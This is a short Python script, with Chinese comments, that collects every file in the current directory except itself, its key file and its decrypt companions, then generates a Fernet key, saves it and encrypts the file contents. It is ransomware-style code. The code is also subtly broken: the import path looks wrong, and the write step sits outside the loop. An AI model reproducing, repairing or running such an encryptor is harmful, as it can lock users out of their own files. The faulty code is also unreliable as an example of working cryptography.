import fernet
import os

files = []
for file in os.listdir():
    # 排除“自己人”
    if file == "加密.py" or file == "thekey.key" or file == "解密.py" or file == "加密.exe" or file == "解密.exe":
        continue
    if os.path.isfile(file):
        # 获取该路径下文件的list列表
        files.append(file)
print(files)
key = fernet.Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = fernet.Fernet(key).encrypt(contents)
with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
